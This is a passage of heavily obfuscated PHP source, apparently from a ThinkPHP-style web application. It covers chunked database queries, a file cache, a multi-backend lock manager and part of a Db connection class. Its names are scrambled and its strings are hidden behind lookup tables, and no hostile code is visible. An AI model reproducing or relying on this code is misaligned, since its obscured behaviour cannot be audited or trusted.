$•ğÔÊ[$šŸ•šƒŠ[362]][$ØëÃæ©½][1] = $Ã÷Øöš”; $this->optionsValue($•ğÔÊ); $Šù°„•ã += parent::save($¨ùØ¬ƒÇ, $ùÅ‚…±Ú); $this->chunkEventCheck(count($Ã÷Øöš”)); } $this->chunkEventSet(); return $Šù°„•ã; } public function add($„§´“º„ = '', $½Õ›ÆŒÒ = array(), $”›¼¥Öı = false) { if ($this->addTaskStatus && is_array($„§´“º„)) { $this->addTaskData[] = $„§´“º„; return; } return parent::add($„§´“º„, $½Õ›ÆŒÒ, $”›¼¥Öı); } public function parseWhereLike($˜ôĞ¤Üé, $Í€÷©Êª = '', $’¯¢°İ = false, &$´ğë³ß = false) { $ş£Î‘Ï =& $_SERVER[‰‰Ş‚€]; $÷º˜½ú = $GLOBALS[$ş£Î‘Ï[16]][$ş£Î‘Ï[476]]; if (!$÷º˜½ú[$ş£Î‘Ï[477]]) { return $˜ôĞ¤Üé; } if (!is_array($˜ôĞ¤Üé)) { return $˜ôĞ¤Üé; } $æÁÌÊï = array(); $¦âÕÖ† = 0; foreach ($˜ôĞ¤Üé as $ö÷¨«à => $ÌÙı¶”) { if (is_array($ÌÙı¶”) && count($ÌÙı¶”) == 2 && $ÌÙı¶”[0] == $ş£Î‘Ï[478] && is_string($ÌÙı¶”[1]) && substr($ÌÙı¶”[1], 0, 1) == $ş£Î‘Ï[479] && substr($ÌÙı¶”[1], strlen($ÌÙı¶”[1]) - 1, 1) == $ş£Î‘Ï[479]) { $´ğë³ß = !0; $øØî®¥— = is_string($ö÷¨«à) ? $ö÷¨«à : $Í€÷©Êª; $±ÒĞıÌ = substr($ÌÙı¶”[1], 1, strlen($ÌÙı¶”[1]) - 2); $±ÒĞıÌ = $this->db->escapeString($±ÒĞıÌ); if (!strpos($øØî®¥—, $ş£Î‘Ï[20])) { $øØî®¥— = $ş£Î‘Ï[480] . $øØî®¥— . $ş£Î‘Ï[480]; } $›í‚ ıÌ = $ş£Î‘Ï[231] . $±ÒĞıÌ . $ş£Î‘Ï[231]; $±ÒĞıÌ = str_replace(array($ş£Î‘Ï[20], $ş£Î‘Ï[481], $ş£Î‘Ï[21]), $ş£Î‘Ï[482], $±ÒĞıÌ); if ($÷º˜½ú[$ş£Î‘Ï[483]]) { $›í‚ ıÌ = $ş£Î‘Ï[484] . $±ÒĞıÌ . $ş£Î‘Ï[485]; if ($÷º˜½ú[$ş£Î‘Ï[486]]) { $›í‚ ıÌ = $ş£Î‘Ï[485] . $±ÒĞıÌ . $ş£Î‘Ï[484]; } } $æÁÌÊï[$¦âÕÖ†] = $ş£Î‘Ï[487] . $øØî®¥— . $ş£Î‘Ï[488] . $›í‚ ıÌ . $ş£Î‘Ï[489]; $¦âÕÖ†++; continue; } if (is_array($ÌÙı¶”)) { $Í€÷©Êª = is_string($ö÷¨«à) ? $ö÷¨«à : $Í€÷©Êª; $ÌÙı¶” = $this->parseWhereLike($ÌÙı¶”, $Í€÷©Êª, !0, $´ğë³ß); } if (is_numeric($ö÷¨«à)) { $æÁÌÊï[$¦âÕÖ†] = $ÌÙı¶”; $¦âÕÖ†++; } else { $æÁÌÊï[$ö÷¨«à] = $ÌÙı¶”; } } if ($´ğë³ß && !$’¯¢°İ) { } return $æÁÌÊï; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‹™ÏíÑ¢ = array()) { $½ëŸ­ =& $_SERVER[‰‰Ş‚€]; $Ê…´¯¥» = self::SQL_WHERE_IN_CHUNK; $Ñ¶“û–Â = $this->optionsValue(); $÷ª¡ÕĞ¢ = $this->findWhereField($Ñ¶“û–Â); if (!$÷ª¡ÕĞ¢ || isset($Ñ¶“û–Â[$½ëŸ­[377]]) || isset($Ñ¶“û–Â[$½ëŸ­[437]])) { return parent::select($‹™ÏíÑ¢); } $®ö±õö• = $Ñ¶“û–Â[$½ëŸ­[362]][$÷ª¡ÕĞ¢][1]; $®ö±õö• = is_array($®ö±õö•) ? $®ö±õö• : array(); $ÍÎ¢£ïœ = null; for ($¸‰ëƒ³§ = 0; $¸‰ëƒ³§ < count($®ö±õö•); $¸‰ëƒ³§ += $Ê…´¯¥») { $£Ä’àÄù = array_slice($®ö±õö•, $¸‰ëƒ³§, $Ê…´¯¥»); if (!is_array($£Ä’àÄù) || count($£Ä’àÄù) == 0) { break; } $Ñ¶“û–Â[$½ëŸ­[362]][$÷ª¡ÕĞ¢][1] = $£Ä’àÄù; $this->optionsValue($Ñ¶“û–Â); $Äƒ“ÎÁ“ = parent::select($‹™ÏíÑ¢); if (!$Äƒ“ÎÁ“) { continue; } $ÍÎ¢£ïœ = is_array($ÍÎ¢£ïœ) ? $ÍÎ¢£ïœ : array(); $ÍÎ¢£ïœ = array_merge($ÍÎ¢£ïœ, $Äƒ“ÎÁ“); } return $ÍÎ¢£ïœ; } public function delete($û ı¶ßü = array()) { $ñ‘ì…» =& $_SERVER[‰‰Ş‚€]; $š£İİ²¤ = self::SQL_WHERE_IN_CHUNK; $–Ç³ğÏ¸ = $this->optionsValue(); $Â¯¥›’Î = $this->findWhereField($–Ç³ğÏ¸); if (!$Â¯¥›’Î) { return parent::delete($û ı¶ßü); } $òàİ“Æ = 0; $ë‰ºòãÏ = $–Ç³ğÏ¸[$ñ‘ì…»[362]][$Â¯¥›’Î][1]; $ë‰ºòãÏ = is_array($ë‰ºòãÏ) ? $ë‰ºòãÏ : array(); for ($ë‹éÂ¶Á = 0; $ë‹éÂ¶Á < count($ë‰ºòãÏ); $ë‹éÂ¶Á += $š£İİ²¤) { $ß±Ï±Ì¯ = array_slice($ë‰ºòãÏ, $ë‹éÂ¶Á, $š£İİ²¤); if (!is_array($ß±Ï±Ì¯) || count($ß±Ï±Ì¯) == 0) { break; } $–Ç³ğÏ¸[$ñ‘ì…»[362]][$Â¯¥›’Î][1] = $ß±Ï±Ì¯; $this->optionsValue($–Ç³ğÏ¸); $òàİ“Æ += parent::delete($û ı¶ßü); } return $òàİ“Æ; } private function findWhereField($°ˆÈıÂ¼) { $¸¿¢ÑòŠ =& $_SERVER[‰‰Ş‚€]; $ï®™ ÊÔ = self::SQL_WHERE_IN_CHUNK; if (!is_array($°ˆÈıÂ¼) || !is_array($°ˆÈıÂ¼[$¸¿¢ÑòŠ[362]])) { return !1; } foreach ($°ˆÈıÂ¼[$¸¿¢ÑòŠ[362]] as $Ç†®‰­ú => $µ†æËæ) { if (is_array($µ†æËæ) && isset($µ†æËæ[0]) && is_string($µ†æËæ[0]) && strtolower($µ†æËæ[0]) == $¸¿¢ÑòŠ[17] && is_array($µ†æËæ[1]) && count($µ†æËæ[1]) > $ï®™ ÊÔ) { ignore_timeout(); return $Ç†®‰­ú; } } return !1; } public function setMasterDB($Æ«Ú˜Ú = true) { think_config($_SERVER[‰‰Ş‚€][490], $Æ«Ú˜Ú); } } goto C°åœ«âØÂ; Eò“²Ûùˆ–: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($šÁğğ¢‰, $„ø¤¢) { $‰Äòı‰ =& $_SERVER[‰‰Ş‚€]; $this->cachePath = $šÁğğ¢‰[$‰Äòı‰[97]]; $this->prefix = $‰Äòı‰[942]; $this->cacheTime = $„ø¤¢; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ß¶ğ©) { $áª÷£êö =& $_SERVER[‰‰Ş‚€]; $ß¶ğ© = str_replace(array($áª÷£êö[943], $áª÷£êö[108], $áª÷£êö[86]), $áª÷£êö[944], $ß¶ğ©); return $this->cachePath . $áª÷£êö[945] . $ß¶ğ© . $áª÷£êö[946]; } public function set($­®û‰Şë, $ëãÄî´, $¢¯Š¼ô = false) { $¢¯Š¼ô = $¢¯Š¼ô ? $¢¯Š¼ô : $this->cacheTime; $ÄÈÊ·¤™ = $this->getFile($­®û‰Şë); if (file_put_contents($ÄÈÊ·¤™, $this->prefix . $ëãÄî´, LOCK_EX)) { @touch($ÄÈÊ·¤™, intval(time() + $¢¯Š¼ô)); clearstatcache(); return !0; } @unlink($ÄÈÊ·¤™); return !1; } public function get($…ÕÂÅİ–) { $·æ²“İ = $this->getFile($…ÕÂÅİ–); if (file_exists($·æ²“İ) && filemtime($·æ²“İ) < time()) { @unlink($·æ²“İ); return !1; } $¾¢é‰îû = @file_get_contents($·æ²“İ); return substr($¾¢é‰îû, strlen($this->prefix)); } public function remove($éË¯½›º) { $Ëı¹­ø° = $this->getFile($éË¯½›º); return @unlink($Ëı¹­ø°); } public function deleteAll() { $±Ô»Î©† =& $_SERVER[‰‰Ş‚€]; $ĞÁå¡û¬ = scandir($this->cachePath); foreach ($ĞÁå¡û¬ as $½ıêëË£) { $¯½…Š­Á = $this->cachePath . $½ıêëË£; if (strpos($¯½…Š­Á, $±Ô»Î©†[946]) && strpos($¯½…Š­Á, $±Ô»Î©†[947])) { @unlink($¯½…Š­Á); } } } public function clearTimeout() { $¦„¯º“ =& $_SERVER[‰‰Ş‚€]; $Ï©£¸Ü = scandir($this->cachePath); foreach ($Ï©£¸Ü as $é„»ª–) { $­††ê©² = $this->cachePath . $é„»ª–; if (strpos($­††ê©², $¦„¯º“[946]) && strpos($­††ê©², $¦„¯º“[947]) && filemtime($­††ê©²) < time()) { @unlink($­††ê©²); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $”²Àşƒé =& $_SERVER[‰‰Ş‚€]; if (self::$handle) { return self::$handle; } $ åâ¼ûê = $GLOBALS[$”²Àşƒé[16]][$”²Àşƒé[433]]; self::$timeout = $ åâ¼ûê[$”²Àşƒé[948]] ? $ åâ¼ûê[$”²Àşƒé[948]] : 10; $ãÔÛå¦É = _get($GLOBALS[$”²Àşƒé[16]], $”²Àşƒé[949]); $ö¡ğ‰ÌÁ = $ åâ¼ûê[$”²Àşƒé[931]] ? $ åâ¼ûê[$”²Àşƒé[931]] : $”²Àşƒé[241]; if ($ö¡ğ‰ÌÁ == $”²Àşƒé[31] && $ãÔÛå¦É == $”²Àşƒé[23]) { $ö¡ğ‰ÌÁ = $”²Àşƒé[241]; } switch ($ö¡ğ‰ÌÁ) { case $”²Àşƒé[934]: self::$handle = new CacheLockRedis(); break; case $”²Àşƒé[935]: self::$handle = new CacheLockMemcached(); break; case $”²Àşƒé[31]: self::$handle = new CacheLockDatabase(); break; case $”²Àşƒé[241]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($”²Àşƒé[950], $”²Àşƒé[951]); } return self::$handle; } private static function key($Ãµ¤ÜÑ) { return $_SERVER[‰‰Ş‚€][952] . Cache::key($Ãµ¤ÜÑ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ğ…Ö›É = '') { self::$errorMsg = $ğ…Ö›É; } public static function lockGlobal($Åã«ôÂç, $Úˆü¾ÑÌ) { return self::lock($Åã«ôÂç, $Úˆü¾ÑÌ, !0); } public static function lock($Æ“³ªøÇ, $Ç¥¥±èª = false, $¡«šˆæÍ = false) { $µı‚ÁùÒ =& $_SERVER[‰‰Ş‚€]; $€ì¨˜ = self::init(); $ùÄ½æûì = self::key($Æ“³ªøÇ); $Ç¥¥±èª = $Ç¥¥±èª ? $Ç¥¥±èª : self::$timeout; $Í¡û¯­» = timeFloat(); if (_get($GLOBALS, $µı‚ÁùÒ[953], !1)) { if (!$€ì¨˜->lock($ùÄ½æûì, 0.2)) { die; } return !0; } $àÈöí× = $€ì¨˜->lock($ùÄ½æûì, $Ç¥¥±èª); $ç¿Ó»„² = timeFloat(); if (!$àÈöí×) { $Ò×öàïó = "\x6c\x6f\143\153\x20\x65\162\162\157\x72\73\153\x65\x79\x3d{$Æ“³ªøÇ}\x3b\164\x69\x6d\145\75{$Ç¥¥±èª}\x3b" . self::$errorMsg . $µı‚ÁùÒ[84] . get_caller_msg(); $ıîóŒĞˆ = LNG($µı‚ÁùÒ[954]) . "\50{$Ç¥¥±èª}\x73\51\x2e" . LNG($µı‚ÁùÒ[955]); $ıîóŒĞˆ .= $µı‚ÁùÒ[956]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ıîóŒĞˆ = $ıîóŒĞˆ . $µı‚ÁùÒ[957] . self::$errorMsg; } write_log($µı‚ÁùÒ[958] . sprintf($µı‚ÁùÒ[959], timeFloat() - $Í¡û¯­») . $µı‚ÁùÒ[960] . $Ò×öàïó . $µı‚ÁùÒ[961] . json_encode(error_get_last()), $µı‚ÁùÒ[951]); show_json($ıîóŒĞˆ, !1); } if (!$¡«šˆæÍ) { self::$lockItem[$ùÄ½æûì] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Š¸í€‰À = number_format(timeFloat() - $ç¿Ó»„², 3); write_log($µı‚ÁùÒ[962] . $Æ“³ªøÇ . $µı‚ÁùÒ[963] . $Š¸í€‰À, $µı‚ÁùÒ[951]); } return $àÈöí×; } public static function lockGet($Ğ˜¾ˆª) { $ˆ½¡ÕÂä = self::key($Ğ˜¾ˆª); if (self::$lockItem[$ˆ½¡ÕÂä]) { return self::$lockItem[$ˆ½¡ÕÂä]; } return self::init()->lockGet($ˆ½¡ÕÂä); } public static function unlock($ò‘Œ×º) { $Ã…Òô µ =& $_SERVER[‰‰Ş‚€]; $Ü•ÁäØƒ = self::key($ò‘Œ×º); self::$lockItem[$Ü•ÁäØƒ] = null; self::init()->unlock($Ü•ÁäØƒ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ã…Òô µ[964] . $ò‘Œ×º, $Ã…Òô µ[951]); } return; } public static function unlockRuntime() { $ÌŸ‡ÁÂˆ =& $_SERVER[‰‰Ş‚€]; $ş®è†µ = self::init(); $´²Äµ©à = !1; foreach (self::$lockItem as $ùèÈâ® => $èÕŒùƒ°) { if (!$èÕŒùƒ°) { continue; } $ş®è†µ->unlock($ùèÈâ®); if (!$´²Äµ©à) { $´²Äµ©à = !0; write_log($ÌŸ‡ÁÂˆ[965] . $ùèÈâ® . $ÌŸ‡ÁÂˆ[84] . get_caller_msg(), $ÌŸ‡ÁÂˆ[951]); continue; } write_log($ÌŸ‡ÁÂˆ[965] . $ùèÈâ®, $ÌŸ‡ÁÂˆ[951]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¶ğÛÁø° = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÌŸ‡ÁÂˆ[966] . $¶ğÛÁø° . $ÌŸ‡ÁÂˆ[967] . ACTION, $ÌŸ‡ÁÂˆ[951]); } } public static function fileLock($Òü˜´î³) { $Æı“Ùà‡ =& $_SERVER[‰‰Ş‚€]; if (!$GLOBALS[$Æı“Ùà‡[968]]) { $GLOBALS[$Æı“Ùà‡[968]] = array(); } $GLOBALS[$Æı“Ùà‡[968]][$Òü˜´î³] = !1; $»³¯«ÍŸ = fopen(DATA_PATH . $Òü˜´î³ . $Æı“Ùà‡[969], $Æı“Ùà‡[970]); if (!$»³¯«ÍŸ) { return !1; } $GLOBALS[$Æı“Ùà‡[968]][$Òü˜´î³] = $»³¯«ÍŸ; if (flock($»³¯«ÍŸ, LOCK_EX)) { return !0; } self::unlock($Òü˜´î³); show_json($Æı“Ùà‡[971], !1); return !1; } public static function fileUnlock($³ïë¿ˆ‰) { $³éëˆÉ­ =& $_SERVER[‰‰Ş‚€]; $Îâ‡»¢± = $GLOBALS[$³éëˆÉ­[968]][$³ïë¿ˆ‰]; if (!$Îâ‡»¢±) { return; } $GLOBALS[$³éëˆÉ­[968]][$³ïë¿ˆ‰] = !1; flock($Îâ‡»¢±, LOCK_UN); fclose($Îâ‡»¢±); } public static function fileUnlockAll() { $çï®á€¶ =& $_SERVER[‰‰Ş‚€]; if (!isset($GLOBALS[$çï®á€¶[968]]) || !$GLOBALS[$çï®á€¶[968]]) { return; } foreach ($GLOBALS[$çï®á€¶[968]] as $Á¸‰ø—ä => $¬Â·”«•) { if (!$¬Â·”«•) { continue; } $GLOBALS[$çï®á€¶[968]][$Á¸‰ø—ä] = !1; flock($¬Â·”«•, LOCK_UN); fclose($¬Â·”«•); } $GLOBALS[$çï®á€¶[968]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto A¬ÑíÙÇ¹‡; bÕ“«Ÿ§œ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\145\x71" => "\74\76", "\x67\x74" => "\76", "\145\147\164" => "\76\75", "\x6c\164" => "\74", "\145\x6c\164" => "\74\x3d", "\156\157\164\154\151\x6b\145" => "\116\x4f\x54\40\114\111\113\x45", "\x6c\x69\x6b\x65" => "\114\111\113\x45", "\151\156" => "\111\x4e", "\156\157\164\x69\156" => "\116\x4f\x54\x20\x49\116", "\x6e\157\x74\x20\151\156" => "\x4e\x4f\x54\40\111\116", "\x62\145\164\167\145\145\156" => "\x42\105\x54\127\x45\x45\x4e", "\x6e\157\164\x62\145\x74\x77\145\x65\x6e" => "\x4e\x4f\x54\x20\x42\105\124\127\x45\105\116", "\x6e\157\x74\x20\x62\x65\164\167\145\145\x6e" => "\x4e\x4f\124\x20\x42\105\x54\x57\105\x45\116"); protected $selectSql = "\123\x45\114\105\103\124\45\x44\111\123\x54\x49\116\x43\124\45\x20\x25\106\x49\105\x4c\x44\45\x20\x46\122\117\x4d\x20\x25\x54\x41\x42\114\x45\45\x25\x4a\117\111\116\45\x25\127\x48\x45\122\x45\45\45\107\x52\x4f\125\x50\x25\x25\110\101\x56\x49\x4e\x47\45\x25\117\122\104\105\122\x25\x25\114\x49\115\111\x54\45\x20\x25\x55\x4e\111\117\x4e\45\45\x43\x4f\x4d\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $…Ú²ëïÑ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‰‰Ş‚€][1070], $…Ú²ëïÑ); } public function factory($Œƒµ¸Ê = '') { $±˜ì‹Šı =& $_SERVER[‰‰Ş‚€]; $Œƒµ¸Ê = $this->parseConfig($Œƒµ¸Ê); if (empty($Œƒµ¸Ê[$±˜ì‹Šı[1071]])) { think_exception(think_lang($±˜ì‹Šı[1072])); } $this->dbType = ucwords(strtolower($Œƒµ¸Ê[$±˜ì‹Šı[1071]])); $“•£è–ú = $±˜ì‹Šı[1073] . $this->dbType; if (class_exists($“•£è–ú)) { $ÇØ÷ù = new $“•£è–ú($Œƒµ¸Ê); if ($±˜ì‹Šı[1074] != strtolower($Œƒµ¸Ê[$±˜ì‹Šı[1071]])) { $ÇØ÷ù->dbType = strtoupper($this->dbType); } else { $ÇØ÷ù->dbType = $this->_getDsnType($Œƒµ¸Ê[$±˜ì‹Šı[1026]]); } } else { think_exception(think_lang($±˜ì‹Šı[1075]) . $±˜ì‹Šı[1076] . $“•£è–ú); } return $ÇØ÷ù; } public function __call($èî–Øõê, $éŠŠãö¤) { if (method_exists($this, $èî–Øõê)) { return call_user_func_array(array($this, $èî–Øõê), $éŠŠãö¤); } } protected function _getDsnType($Ô¢–Ã´) { $ÓŸ´‚ÙŒ = explode($_SERVER[‰‰Ş‚€][14], $Ô¢–Ã´); $¥²ô£½³ = strtoupper(trim($ÓŸ´‚ÙŒ[0])); return $¥²ô£½³; } private function parseConfig($•æ¡’×ƒ = '') { $ÈËô¥¬¡ =& $_SERVER[‰‰Ş‚€]; if (!empty($•æ¡’×ƒ) && is_string($•æ¡’×ƒ)) { $•æ¡’×ƒ = $this->parseDSN($•æ¡’×ƒ); } elseif (is_array($•æ¡’×ƒ)) { $•æ¡’×ƒ = array_change_key_case($•æ¡’×ƒ); $•æ¡’×ƒ = array($ÈËô¥¬¡[1071] => $•æ¡’×ƒ[$ÈËô¥¬¡[1077]], $ÈËô¥¬¡[995] => $•æ¡’×ƒ[$ÈËô¥¬¡[1078]], $ÈËô¥¬¡[996] => $•æ¡’×ƒ[$ÈËô¥¬¡[1079]], $ÈËô¥¬¡[993] => $•æ¡’×ƒ[$ÈËô¥¬¡[1080]], $ÈËô¥¬¡[994] => $•æ¡’×ƒ[$ÈËô¥¬¡[1081]], $ÈËô¥¬¡[31] => $•æ¡’×ƒ[$ÈËô¥¬¡[1082]], $ÈËô¥¬¡[1026] => $•æ¡’×ƒ[$ÈËô¥¬¡[1083]], $ÈËô¥¬¡[27] => isset($•æ¡’×ƒ[$ÈËô¥¬¡[1084]]) ? $•æ¡’×ƒ[$ÈËô¥¬¡[1084]] : array()); } elseif (empty($•æ¡’×ƒ)) { if (think_config($ÈËô¥¬¡[1085]) && $ÈËô¥¬¡[1074] != strtolower(think_config($ÈËô¥¬¡[1086]))) { $•æ¡’×ƒ = $this->parseDSN(think_config($ÈËô¥¬¡[1085])); } else { $•æ¡’×ƒ = array($ÈËô¥¬¡[1071] => think_config($ÈËô¥¬¡[1086]), $ÈËô¥¬¡[995] => think_config($ÈËô¥¬¡[1087]), $ÈËô¥¬¡[996] => think_config($ÈËô¥¬¡[1088]), $ÈËô¥¬¡[993] => think_config($ÈËô¥¬¡[1089]), $ÈËô¥¬¡[994] => think_config($ÈËô¥¬¡[1090]), $ÈËô¥¬¡[31] => think_config($ÈËô¥¬¡[333]), $ÈËô¥¬¡[1026] => think_config($ÈËô¥¬¡[1085]), $ÈËô¥¬¡[27] => think_config($ÈËô¥¬¡[1091])); } } return $•æ¡’×ƒ; } protected function initConnect($óİØİßÏ = true) { if (1 == think_config($_SERVER[‰‰Ş‚€][32])) { $this->_linkID = $this->multiConnect($óİØİßÏ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ò¸é¿Ğ => $÷ä‘İŞÈ) { $this->_linkID = $÷ä‘İŞÈ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ßÃ€Œ– = false) { $ÜØÖ¨Á” =& $_SERVER[‰‰Ş‚€]; static $—é¸õş = array(); static $ãõó¦µ‹ = -1; if (empty($—é¸õş)) { foreach ($this->config as $ÙäŒúù† => $…©şÙ’Ÿ) { $—é¸õş[$ÙäŒúù†] = explode($ÜØÖ¨Á”[60], $…©şÙ’Ÿ); } } if (think_config($ÜØÖ¨Á”[1092])) { if ($ßÃ€Œ– || think_config($ÜØÖ¨Á”[490]) === !0) { $àåä®«‰ = floor(mt_rand(0, think_config($ÜØÖ¨Á”[1093]) - 1)); $ãõó¦µ‹ = $àåä®«‰; } else { if (is_numeric(think_config($ÜØÖ¨Á”[1094]))) { $àåä®«‰ = think_config($ÜØÖ¨Á”[1094]); } else { $àåä®«‰ = floor(mt_rand(think_config($ÜØÖ¨Á”[1093]), count($—é¸õş[$ÜØÖ¨Á”[993]]) - 1)); } } } else { $àåä®«‰ = floor(mt_rand(0, count($—é¸õş[$ÜØÖ¨Á”[993]]) - 1)); $ãõó¦µ‹ = $àåä®«‰; } $àåä®«‰ = $ãõó¦µ‹ !== -1 ? $ãõó¦µ‹ : $àåä®«‰; $Öõ±ÖÏ‚ = array($ÜØÖ¨Á”[995] => isset($—é¸õş[$ÜØÖ¨Á”[995]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[995]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[995]][0], $ÜØÖ¨Á”[996] => isset($—é¸õş[$ÜØÖ¨Á”[996]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[996]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[996]][0], $ÜØÖ¨Á”[993] => isset($—é¸õş[$ÜØÖ¨Á”[993]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[993]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[993]][0], $ÜØÖ¨Á”[994] => isset($—é¸õş[$ÜØÖ¨Á”[994]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[994]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[994]][0], $ÜØÖ¨Á”[31] => isset($—é¸õş[$ÜØÖ¨Á”[31]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[31]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[31]][0], $ÜØÖ¨Á”[1026] => isset($—é¸õş[$ÜØÖ¨Á”[1026]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[1026]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[1026]][0], $ÜØÖ¨Á”[27] => isset($—é¸õş[$ÜØÖ¨Á”[27]][$àåä®«‰]) ? $—é¸õş[$ÜØÖ¨Á”[27]][$àåä®«‰] : $—é¸õş[$ÜØÖ¨Á”[27]][0]); return $this->connect($Öõ±ÖÏ‚, $àåä®«‰); } public function parseDSN($ˆ¨áÈº¦) { $şÑëİ‰ =& $_SERVER[‰‰Ş‚€]; if (empty($ˆ¨áÈº¦)) { return !1; } $õœü–Í× = parse_url($ˆ¨áÈº¦); if ($õœü–Í×[$şÑëİ‰[216]]) { $éÊğ‚¥ = array($şÑëİ‰[1071] => $õœü–Í×[$şÑëİ‰[216]], $şÑëİ‰[995] => isset($õœü–Í×[$şÑëİ‰[685]]) ? $õœü–Í×[$şÑëİ‰[685]] : $şÑëİ‰[22], $şÑëİ‰[996] => isset($õœü–Í×[$şÑëİ‰[1095]]) ? $õœü–Í×[$şÑëİ‰[1095]] : $şÑëİ‰[22], $şÑëİ‰[993] => isset($õœü–Í×[$şÑëİ‰[217]]) ? $õœü–Í×[$şÑëİ‰[217]] : $şÑëİ‰[22], $şÑëİ‰[994] => isset($õœü–Í×[$şÑëİ‰[218]]) ? $õœü–Í×[$şÑëİ‰[218]] : $şÑëİ‰[22], $şÑëİ‰[31] => isset($õœü–Í×[$şÑëİ‰[97]]) ? substr($õœü–Í×[$şÑëİ‰[97]], 1) : $şÑëİ‰[22]); } else { preg_match($şÑëİ‰[1096], trim($ˆ¨áÈº¦), $ßğÜ»ñ¥); $éÊğ‚¥ = array($şÑëİ‰[1071] => $ßğÜ»ñ¥[1], $şÑëİ‰[995] => $ßğÜ»ñ¥[2], $şÑëİ‰[996] => $ßğÜ»ñ¥[3], $şÑëİ‰[993] => $ßğÜ»ñ¥[4], $şÑëİ‰[994] => $ßğÜ»ñ¥[5], $şÑëİ‰[31] => $ßğÜ»ñ¥[6]); } $éÊğ‚¥[$şÑëİ‰[1026]] = $şÑëİ‰[22]; return $éÊğ‚¥; } protected function debug() { $ÓÁ™…Ô« =& $_SERVER[‰‰Ş‚€]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÓÁ™…Ô«[1097]; if (think_config($ÓÁ™…Ô«[1098])) { think_status($ÓÁ™…Ô«[1099]); think_trace($this->queryStr . $ÓÁ™…Ô«[1100] . think_status($ÓÁ™…Ô«[34], $ÓÁ™…Ô«[1099], 6) . $ÓÁ™…Ô«[1101], $ÓÁ™…Ô«[22], $ÓÁ™…Ô«[1102]); } } protected function parseLock($Á¡íò = false) { $ÛÀàÈ =& $_SERVER[‰‰Ş‚€]; if (!$Á¡íò) { return $ÛÀàÈ[22]; } if ($ÛÀàÈ[1028] == $this->dbType) { return $ÛÀàÈ[1103]; } return $ÛÀàÈ[1104]; } protected function parseSet($õİ¹œ´) { $öÕé»äÌ =& $_SERVER[‰‰Ş‚€]; foreach ($õİ¹œ´ as $»›ŠÂ™Ñ => $ ‡¤…ù°) { if (is_array($ ‡¤…ù°) && $öÕé»äÌ[381] == $ ‡¤…ù°[0]) { $òñç¶±‹[] = $this->parseKey($»›ŠÂ™Ñ) . $öÕé»äÌ[472] . $ ‡¤…ù°[1]; } elseif (is_scalar($ ‡¤…ù°) || is_null($ ‡¤…ù°)) { $òñç¶±‹[] = $this->parseKey($»›ŠÂ™Ñ) . $öÕé»äÌ[472] . $this->parseValue($ ‡¤…ù°); } } return $öÕé»äÌ[1105] . implode($öÕé»äÌ[60], $òñç¶±‹); } protected function bindParam($ñŞşêôé, $áº÷Şï¨) { $this->bind[$_SERVER[‰‰Ş‚€][14] . $ñŞşêôé] = $áº÷Şï¨; } protected function parseBind($Æ©ÀÍÜò) { $Æ©ÀÍÜò = array_merge($this->bind, $Æ©ÀÍÜò); $this->bind = array(); return $Æ©ÀÍÜò; } function parseKey(&$‘€Ä«, $ôÅƒ³Éû = true) { if ($ôÅƒ³Éû) { $‘€Ä« = $this->parseKeyCheck($‘€Ä«); } return $‘€Ä«; } function parseKeyCheck($ùÈ©îü³) { $ì´™°‘¿ =& $_SERVER[‰‰Ş‚€]; $ùÈ©îü³ = trim($ùÈ©îü³); if (!preg_match($ì´™°‘¿[1106], $ùÈ©îü³)) { think_exception($ì´™°‘¿[1107] . $ùÈ©îü³); } return $ùÈ©îü³; } protected function parseValue($²ôÕ¸ê) { $ŸüøÓæá =& $_SERVER[‰‰Ş‚€]; if (is_string($²ôÕ¸ê)) { $²ôÕ¸ê = $ŸüøÓæá[1067] . $this->escapeString($²ôÕ¸ê) . $ŸüøÓæá[1067]; } elseif (isset($²ôÕ¸ê[0]) && is_string($²ôÕ¸ê[0]) && strtolower($²ôÕ¸ê[0]) == $ŸüøÓæá[381]) { 